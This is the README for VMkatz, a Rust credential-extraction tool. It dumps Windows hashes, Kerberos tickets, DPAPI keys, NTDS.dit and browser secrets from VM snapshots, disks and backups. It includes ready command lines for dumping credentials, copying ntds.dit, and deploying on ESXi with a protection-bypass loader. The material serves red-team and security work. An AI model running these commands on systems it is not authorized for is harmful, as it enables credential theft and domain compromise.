# VMkatz

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Build](https://github.com/nikaiw/VMkatz/actions/workflows/release.yml/badge.svg)](https://github.com/nikaiw/VMkatz/actions/workflows/release.yml)
[![CI](https://github.com/nikaiw/VMkatz/actions/workflows/clippy.yml/badge.svg)](https://github.com/nikaiw/VMkatz/actions/workflows/clippy.yml)
[![Platform](https://img.shields.io/badge/platform-linux%20|%20windows%20|%20macos%20|%20esxi-lightgrey)]()

## Too Big to Steal

You are three weeks into a red team engagement. You land on a NAS attached to the virtualization cluster — hundreds of gigabytes of `.vmdk`, `.vmsn`, `.sav` sitting right there. But your link does 200 KB/s. Exfiltrating a single 100 GB disk would take **six days**.

VMkatz exists because you shouldn't have to exfiltrate what you can read in place. It extracts Windows credentials directly from VM files — memory snapshots, virtual disks, Veeam backups: NTLM hashes, Kerberos tickets, DPAPI master keys, LSA secrets, NTDS.dit, BitLocker keys, browser secrets.

The default static x86_64 musl binary fits within 4 MiB. Drop it on the ESXi host, the Proxmox node, or the NAS. Point it at a VM folder and walk away with credentials, not disk images.

## What It Extracts

### From memory snapshots (LSASS)

All 9 SSP credential providers that mimikatz implements:

| Provider | Data | Notes |
| --- | --- | --- |
| MSV1_0 | NT/LM hashes, SHA1 | Physical-scan fallback for paged entries |
| WDigest | Plaintext passwords | Linked-list walk + `.data` fallback |
| Kerberos | AES/RC4/DES keys, tickets (`.kirbi`/`.ccache`) | AVL tree walk + ticket carving for freed sessions |
| TsPkg | Plaintext passwords | RDP sessions only |
| DPAPI | Master key cache (GUID + decrypted key) | SHA1 masterkey for offline DPAPI decrypt |
| SSP | Plaintext credentials | `SspCredentialList` in `msv1_0.dll` |
| LiveSSP | Plaintext credentials | Requires `livessp.dll` (rare post-Win8) |
| Credman | Stored credentials | Hash-table + single-list enumeration |
| CloudAP | Azure AD tokens | Typically empty for local-only logon |

Plus: **BitLocker FVEK** extraction from memory (pool tag scan for `FVEc`/`Cngb`).

### From virtual disks (offline)

- **SAM hashes**: Local account NT/LM hashes with account status (disabled, blank password)
- **LSA secrets**: Service account passwords, auto-logon credentials, machine account keys
- **Cached domain credentials**: DCC2 hashes (last N domain logons)
- **DPAPI master keys**: Hashcat-ready hashes (`$DPAPImk$` — modes 15300/15310/15900/15910)
- **NTDS.dit**: Full Active Directory hash extraction from domain controller disks (native ESE parser)
- **Credential Manager and Vault**: Offline extraction with `--credman` or `--all` (requires `credman`)
- **BitLocker decryption**: Transparent disk decryption using FVEK extracted from memory

## Supported Inputs

| Format | Extensions | Source | Status |
| --- | --- | --- | --- |
| VMware snapshots | `.vmsn` + `.vmem` | Workstation, ESXi | Tested |
| VMware embedded snapshots | `.vmsn` (no `.vmem`) | ESXi suspend | Tested |
| VirtualBox saved states | `.sav` | VirtualBox | Tested |
| QEMU/KVM savevm states | auto-detected | Proxmox, QEMU | Tested |
| QEMU/KVM ELF core dumps | `.elf` | `virsh dump` | Tested |
| Hyper-V saved states | `.vmrs` | Hyper-V 2016+ | Tested |
| Veeam backups | `.vbk`, `.vib`, `.vrb` | Veeam B&R | Tested |
| VMware virtual disks | `.vmdk` (sparse + flat) | Workstation, ESXi | Tested |
| VirtualBox virtual disks | `.vdi` | VirtualBox | Tested |
| QEMU/KVM virtual disks | `.qcow2` | QEMU, Proxmox | Tested |
| Hyper-V virtual disks | `.vhdx`, `.vhd` | Hyper-V | Tested |
| VMFS-5/6 raw SCSI devices | `/dev/disks/...` | ESXi (bypasses file locks) | Tested |
| LVM block devices | `/dev/...` | Proxmox LVM-thin | Tested |
| Raw registry hives | `SAM`, `SYSTEM`, `SECURITY` | `reg save` | Tested |
| Raw NTDS.dit | `ntds.dit` + `SYSTEM` | Domain controller | Tested |
| LSASS minidump | `.dmp` | procdump, Task Manager | Tested |
| VM directories | any folder | Auto-discovers all files | Tested |

**Target OS**: Windows Server 2003 through Windows Server 2025 / Windows 11 24H2 (x86 PAE + x64).

## Quick Start

These examples use the default build. Optional browser and Veeam commands are
described below. Paths and passwords in examples are placeholders.

```bash
# Extract LSASS credentials from a VMware snapshot
./vmkatz snapshot.vmsn

# With pagefile resolution for paged-out creds
./vmkatz --disk disk.vmdk snapshot.vmsn

# Extract SAM/LSA/DCC2 from a virtual disk
./vmkatz disk.vmdk

# Extract AD hashes from a domain controller disk
./vmkatz --ntds dc-disk.qcow2

# Point at a VM folder and let it find everything
./vmkatz /path/to/vm-directory/

# Extract from raw registry hives
./vmkatz SAM SYSTEM SECURITY

# Extract from a raw NTDS database and its SYSTEM hive
./vmkatz ntds.dit SYSTEM

# Output as hashcat-ready hashes
./vmkatz --format hashcat snapshot.vmsn

# Export Kerberos tickets
./vmkatz --kirbi ./tickets snapshot.vmsn          # Destination directory
./vmkatz --ccache ./tickets.ccache snapshot.vmsn  # Destination file

# Export BitLocker FVEK for dislocker
./vmkatz --bitlocker-fvek /tmp/keys snapshot.vmsn

# Recursively scan all VMs under a path
./vmkatz -r /vmfs/volumes/datastore1/

# Parse LSASS minidump
./vmkatz lsass.dmp

# Extract from Hyper-V saved state
./vmkatz guest.vmrs

# Extract all compiled secret categories, including associated memory snapshots
./vmkatz --all disk.vmdk
```

## Command-line options

```text
vmkatz [OPTIONS] [FILE]...
```

Use `./vmkatz --help` for the options available in your binary (`-h` gives a
shorter summary). The tables below cover all features. Options for disabled
features are rejected; see [Build Features](#build-features). A dash in the
feature column means the option itself is always available; the input format
still needs its backend. Browser flags are listed in the
[browser section](#browser-secrets-experimental).

Pass one snapshot, disk image, backup or VM directory, or one of the raw-file
combinations `SAM SYSTEM [SECURITY]` and `ntds.dit SYSTEM`. To process several
VMs, use directory or recursive mode. VMFS commands identify their source with
`--vmfs-device` instead of a positional file.

### General and memory options

| Option | Purpose | Feature |
| --- | --- | --- |
| `-h`, `--help` | Show help | — |
| `-V`, `--version` | Show version | — |
| `-v`, `--verbose` | Increase logging; repeat as `-vv` for more detail | — |
| `--format <FORMAT>` | `text` (default), `brief`, `ntlm`, `hashcat` or `csv` | — |
| `--color <WHEN>` | `auto` (default), `always` or `never` | — |
| `-a`, `--all` | Enable all compiled secret categories, retain all logon sessions and include snapshots associated with disk inputs | — |
| `-r`, `--recurse` | Recursively discover VM files under a directory | — |
| `--scan <TYPE>` | Limit directory discovery to `all` (default), `snapshot` or `disk` | — |
| `--provider <LIST>` | Filter memory-credential output by comma-separated provider names | — |
| `--list-processes` | List processes without credential extraction | — |
| `--lsass` | Also process memory snapshots associated with the selected VM/disk | — |
| `--disk <DISK_IMAGE>` | Supply a companion disk for paged-out memory and hybrid browser extraction | `disk` |
| `--kirbi <DIR>` | Export recovered Kerberos tickets as individual `.kirbi` files | — |
| `--ccache <FILE>` | Export recovered Kerberos tickets as one MIT Kerberos ccache file | — |
| `--bitlocker-fvek <DIR>` | Export recovered memory FVEKs as dislocker-compatible `.fvek` files | — |
| `--ept` | Attempt nested EPT scanning for VBS/Credential Guard VMs | — |
| `--carve` | Enable fallback extraction from partial, truncated or raw memory | `carve` |
| `--dump <PROCESS_NAME>` | Write a process minidump, e.g. `--dump lsass` | `dump` |
| `-o`, `--output <FILE>` | Destination for `--dump`; default: `<process>.dmp` | `dump` |
| `--build <NUMBER>` | Windows build number written into the minidump header; default: `19045` | `dump` |
| `--no-mem-registry` | Disable both indexed and signature-based recovery of registry hives from memory | `sam` |
| `--registry-carve` | Enable a physical-memory hive scan when indexed recovery fails; slow and potentially several GiB of RAM | `sam` |

Provider names are `msv`, `wdigest`, `kerberos`, `tspkg`, `dpapi`, `ssp`,
`livessp`, `credman` and `cloudap`. `--provider` filters memory-credential output;
it does not restrict extraction or ticket exports. Use `--kirbi` or `--ccache`
with an explicit destination to save tickets. Both export options can be combined.

`--all` does not enable optional features at build time, ticket-file exports,
password history or the opt-in carving/process-scan flags. Select those options
explicitly when needed. `--no-mem-registry` takes precedence over
`--registry-carve`.

With `--all`, individual extraction failures can be reported on stderr while
processing continues. A successful exit does not imply every category was recovered.
For a local disk image, an open failure or failure of every disk extractor produces
a nonzero exit status; missing NTDS alone does not fail a successful SAM/LSA extraction.

### Disk and offline extraction options

| Option | Purpose | Feature |
| --- | --- | --- |
| `--sam` | Force disk/SAM mode; recognized disk extensions already select disk mode | `sam` |
| `--dpapi` | Scan disk DPAPI masterkey files; already included in normal disk processing when built | `disk` + `dpapi` |
| `--ntds` | Extract AD hashes from `Windows/NTDS/ntds.dit` and the SYSTEM bootkey | `ntds.dit` |
| `--ntds-history` | Include available password history during NTDS extraction | `ntds.dit` |
| `--ntds-domain-prefix <DOMAIN>` | Override the domain prefix in NTDS output, e.g. `CORP` | `ntds.dit` |
| `--credman` | Extract offline Credential Manager and Vault data | `credman` |
| `--credman-attributes` | With `--credman` or `--all`, include encrypted attribute values as hex; entropy-bound attribute decryption is unsupported | `credman` |
| `--dpapi-password <USER:PASSWORD>` | Supply a password for offline Credential Manager extraction; repeatable | `credman` |
| `--dpapi-nthash <USER:HEX>` | Supply a 32-hex-digit NT hash for offline Credential Manager extraction; repeatable | `credman` |
| `--ls <PATH>` | List a guest NTFS directory; use `'\'` for the root | `disk` |
| `--cp <SRC> <DST>` | Stream one guest NTFS file to a new local destination | `disk` |
| `--partition <OFFSET>` | Select an NTFS partition by byte offset, in decimal or `0x` hexadecimal | `disk` |

Use `--dpapi-password` and `--dpapi-nthash` with `--credman` or `--all`.
`USER` can be a SID, a SAM/profile name or `DOMAIN\name`. For local accounts,
supply `--dpapi-password`; an NT hash alone is insufficient for the local
masterkey derivation. Everything after the first colon is the password.
Password options can be visible in the host's process list.

```bash
./vmkatz --credman --dpapi-password 'alice:example-password' disk.vmdk
./vmkatz --ntds --ntds-history --ntds-domain-prefix CORP dc-disk.qcow2
```

#### Listing and copying NTFS files

`--ls` consumes one guest path. `--cp` consumes two values: the guest source and
the host destination. The disk image remains a positional argument:

```bash
./vmkatz --ls '\' disk.vmdk
./vmkatz --ls '\Windows\System32\config' disk.vmdk
./vmkatz --cp '\Windows\NTDS\ntds.dit' ./ntds.dit disk.vmdk
./vmkatz --partition 0x100000 --ls '\' disk.vmdk
```

Without `--partition`, listing reports each detected NTFS partition, while
copying uses the first partition containing the source file. A `path not found`
message for one partition can therefore precede a successful listing on another.
Use the byte offset shown in the listing to select a partition explicitly.
The same selector scopes SAM/LSA, NTDS, DPAPI and Credential Manager extraction.

These commands read disk images or block devices, and also work with an
explicit VMFS `--vmdk` selection. They skip encrypted BitLocker volumes.
`--cp` copies a single file and never overwrites an existing destination;
`--output` is reserved for process dumps. Veeam catalogue extraction uses
`--veeam-extract`, described below.

See [large-file resource limits and recovery tradeoffs](docs/examples.md#large-disks-and-damaged-ntfs-volumes)
for the bounded readers and scans. The opt-in `--registry-carve` memory scan
has a separate, much higher memory cost.

### VMFS options

These options require the `vmfs` feature. Extraction also requires the relevant
secret-extraction features.

| Option | Purpose |
| --- | --- |
| `--vmfs-list` | List VMFS devices and available flat VMDKs, then exit |
| `--vmfs-device <DEVICE>` | Read a VMFS raw SCSI device; also scopes `--vmfs-list` |
| `--vmdk <PATH>` | Select a flat VMDK by its path within that datastore |

```bash
./vmkatz --vmfs-list
./vmkatz --vmfs-device /dev/disks/naa.example --vmdk 'VM/VM-flat.vmdk' --ls '\'
./vmkatz --vmfs-device /dev/disks/naa.example --vmdk 'VM/VM-flat.vmdk' --cp '\Windows\NTDS\ntds.dit' ./ntds.dit
```

See [VMFS discovery and ESXi deployment](docs/esxi.md) for device selection and
associated-snapshot behavior.

### Veeam options

Build with `--features veeam`. Without a catalogue operation, VMkatz processes
supported disk images inside the backup using the extraction features compiled
into the binary.

| Option | Purpose |
| --- | --- |
| `--veeam-password <PASSWORD>` | Open an encrypted backup with its password |
| `--veeam-list` | List stored VMs/files in the backup catalogue, then exit |
| `--veeam-extract <NAME>` | Reconstruct one stored file by exact catalogue name or stable path, then exit |
| `--veeam-output <PATH>` | Destination for that file; default: its basename in the current directory. Existing files are never overwritten |

```bash
./vmkatz backup.vbk
./vmkatz --veeam-list backup.vbk
./vmkatz --veeam-extract 'CATALOGUE_NAME' --veeam-output ./recovered-disk.vmdk backup.vbk
```

Replace `CATALOGUE_NAME` with the selected file's exact catalogue name or stable
path. Add `--veeam-password` for encrypted backups. `--veeam-extract` selects a
stored catalogue file; `--cp` selects a guest NTFS path on a directly opened disk.
Without a password, normal extraction from an encrypted backup emits its
Hashcat target instead of opening the stored disk images.

## Output Formats

| Format | Flag | Description |
| --- | --- | --- |
| `text` | `--format text` (default) | Full credential dump with session metadata |
| `brief` | `--format brief` | Compact one-line-per-credential summary |
| `ntlm` | `--format ntlm` | `DOMAIN\user:::hash:::` pwdump format |
| `hashcat` | `--format hashcat` | Raw hashes: mode 1000 (NTLM), 2100 (DCC2), 15300/15310/15900/15910 (DPAPI) |
| `csv` | `--format csv` | Machine-readable, all fields |

## Deployment on ESXi

```bash
# Cross-compile for ESXi (musl static)
cargo build --release --target x86_64-unknown-linux-musl

# Upload and run
scp target/x86_64-unknown-linux-musl/release/vmkatz root@esxi:/tmp/
/tmp/vmkatz /vmfs/volumes/datastore1/MyVM/MyVM-Snapshot1.vmsn
```

When VIB protection (`execInstalledOnly`) is enabled, use the Python loader — no need to disable the setting:

```bash
scp tools/vmkatz_loader.py target/x86_64-unknown-linux-musl/release/vmkatz root@esxi:/tmp/
python /tmp/vmkatz_loader.py /tmp/vmkatz /vmfs/volumes/datastore1/MyVM/snapshot.vmsn
```

See [docs/esxi.md](docs/esxi.md) for VIB bypass details, VMFS raw device access, and auto-discovery.

## Build Features

Rustup selects the compiler pinned in `rust-toolchain.toml` for local builds, CI and releases. CI checks the default x86_64 musl executable against a 4 MiB limit before packaging. Release jobs report executable sizes for each target.

Features can be enabled or disabled at compile time:

| Feature | Description | Default |
| --- | --- | --- |
| `vmware` | VMware `.vmsn`/`.vmem` snapshot support | Yes |
| `vbox` | VirtualBox `.sav` saved-state support | Yes |
| `qemu` | QEMU/KVM ELF core dumps + Proxmox savevm | Yes |
| `hyperv` | Hyper-V `.vmrs`/`.bin`/`.raw` dump support | Yes |
| `disk` | Disk formats, NTFS, listing/copy, pagefile and file-backed memory | Yes (via `sam`/`vmfs`) |
| `sam` | Registry SAM/LSA/DCC2 extraction, including DPAPI_SYSTEM. Requires `disk` | Yes |
| `dpapi` | DPAPI blobs, masterkeys and CREDHIST; NTFS adapter when `disk` is enabled | Yes |
| `credman` | Offline Credential Manager and Vault. Requires `disk` + `dpapi` | Yes |
| `ntds.dit` | NTDS.dit AD extraction. Requires `sam` | Yes |
| `carve` | Degraded extraction from partial/truncated memory | Yes |
| `dump` | Process memory dump as minidump | Yes |
| `vmfs` | VMFS-5/6 raw parser for ESXi SCSI devices. Requires `disk` | Yes |
| `chrome` | Browser secrets extraction (Chromium + Firefox). Requires `disk` + `dpapi` | No |
| `veeam` | Veeam VBK/VIB/VRB backup support. Requires `disk` | No |

```bash
cargo build --release                                              # Default features
cargo build --release --all-features                               # Include browser and Veeam modules
cargo build --release --no-default-features --features vmware      # VMware only
cargo build --release --no-default-features --features disk          # NTFS listing/copy, no secret extractors
cargo build --release --no-default-features --features "sam ntds.dit"  # Registry/AD only, no offline DPAPI
cargo build --release --no-default-features --features "disk dpapi"   # DPAPI masterkeys, no SAM
cargo build --release --no-default-features --features credman       # Credential Manager/Vault, no SAM
cargo build --release --features chrome                            # Add chrome module
cargo build --release --features veeam                             # Add Veeam backup support
```

The default build retains offline DPAPI and Credential Manager/Vault support. A
`sam`-only build no longer scans DPAPI profile files. `credman` and `chrome` can
run without SAM using supplied credentials; enabling `sam` additionally provides
local hashes and LSA secrets. `ntds.dit` still depends on `sam` for SYSTEM/bootkey
handling. VMFS and Veeam provide access to disks; extraction depends on the other
features selected. `--ls`, `--cp`, `--disk` and `--partition` need only `disk`.
Unsupported feature-specific CLI options are rejected.

`dpapi` alone is also usable as a library (`cargo build --no-default-features
--features dpapi --lib`); the CLI requires a disk or memory backend. Offline
DPAPI APIs live under `vmkatz::dpapi::{blob, masterkey, credhist, disk}` and offline
Credential Manager/Vault APIs under `vmkatz::credman`. LSASS memory providers
remain independent of these offline features.

`make ci` runs the same gates as GitHub CI (fmt, clippy, feature matrix, rustdoc, cargo-deny, cargo-machete, tests); it needs `cargo install cargo-hack cargo-deny cargo-machete`. `make hooks` installs an opt-in pre-commit hook (fmt + clippy).

Clippy checks all targets, including integration tests. Unsafe blocks need a
`SAFETY` explanation, discarded `Result` values must be handled or justified
with a scoped `#[expect(..., reason = "...")]`, and `#[allow]` attributes need a
reason. Upstream Veeam modules retain explicit lint exceptions; the native
Veeam disk adapter follows the normal policy. Debug macros and `mem::forget`
are denied. Test-only helpers may use `unwrap`/`expect` when marked `#[cfg(test)]`.

## Browser secrets (experimental)

The optional `chrome` module extracts saved passwords, cookies, and autofill
from Chromium-family browsers (Chrome, Edge, Brave, Vivaldi, Opera) via
offline DPAPI decryption. Build with `--features chrome`, enable with `--chrome`
or `--all`.

Supports Chrome v10 (`os_crypt.encrypted_key`) and v20 App-Bound Encryption
(Chrome ≥127). Works from disk, memory+disk (hybrid), or both combined.

All the following options require `chrome`:

| Option | Purpose |
| --- | --- |
| `--chrome` | Enable browser-secret extraction |
| `--chrome-json` | Render browser findings as JSON; other extraction output keeps its selected format |
| `--chrome-password <PASSWORD>` | Additional DPAPI password candidate; repeatable |
| `--chrome-nthash <[SID:]HEX>` | Additional 32-hex-digit NT hash; bare hex tries all users, `SID:HEX` targets one user. Repeatable |
| `--chrome-process-scan` | Also scan browser process memory heuristically; requires a memory input and may produce false positives |

```bash
./vmkatz --chrome disk.vmdk                              # Disk-only
./vmkatz --chrome --chrome-password vagrant disk.vmdk    # With extra password
./vmkatz --chrome --disk disk.vmdk snapshot.vmsn         # Hybrid mem+disk
./vmkatz --chrome --chrome-json disk.vmdk                # JSON output
./vmkatz --chrome --chrome-process-scan snapshot.vmsn    # Opt-in process-memory scan
```

For domain users (whose credentials aren't in the local SAM), use
`--chrome-password` with a known plaintext or `--chrome-nthash` with an NT
hash to unlock their browser secrets.

## Documentation

- [ESXi deployment, VIB bypass, VMFS raw access](docs/esxi.md)
- [Example output](docs/examples.md)
- [Large-file resource limits and recovery tradeoffs](docs/examples.md#large-disks-and-damaged-ntfs-volumes)
- [Architecture and module layout](docs/architecture.md)
- [Tested targets and known limitations](docs/tested-targets.md)

## Acknowledgements

- [**mimikatz**](https://github.com/gentilkiwi/mimikatz) by Benjamin Delpy ([@gentilkiwi](https://twitter.com/gentilkiwi)) -- the definitive reference for LSASS internals and Windows credential decryption.
- [**pypykatz**](https://github.com/skelsec/pypykatz) by Tamás Jós ([@skelsec](https://twitter.com/skelsec)) -- pure Python mimikatz reimplementation, used as cross-reference for SAM/LSA/DCC2 extraction.
- [**Impacket**](https://github.com/fortra/impacket) by Fortra (originally Alberto Solino [@agsolino](https://twitter.com/agsolino)) -- reference implementation for NTDS.dit extraction and the pwdump output format.
- [**Vergilius Project**](https://www.vergiliusproject.com/) -- documented Windows kernel structures used to verify EPROCESS field offsets across all supported builds (XP through Win11 24H2).
- [**dissect.vmfs**](https://github.com/fox-it/dissect.vmfs) by Fox-IT (NCC Group) -- Python VMFS parser from the Dissect DFIR framework, used as reference for VMFS on-disk structures.
- [**vmfs-tools**](https://github.com/glandium/vmfs-tools) by Mike Hommey -- open-source VMFS3/5 implementation that documents core on-disk structures and address types.
- [**volatility-kerberos**](https://github.com/airbus-cert/volatility-kerberos) by Sylvain Peyrefitte ([@citronneur](https://twitter.com/citronneur), Airbus CERT) -- Volatility 3 Kerberos plugin, inspired the ticket carving approach for recovering orphaned tickets from freed LSASS memory.
- [**ChromeKatz**](https://github.com/Meckazin/ChromeKatz) by Meckazin -- reference for in-process cookie struct layouts.
- [**Chrome-App-Bound-Encryption-Decryption**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) by xaitax -- reference for the Chrome v20 App-Bound Encryption format.
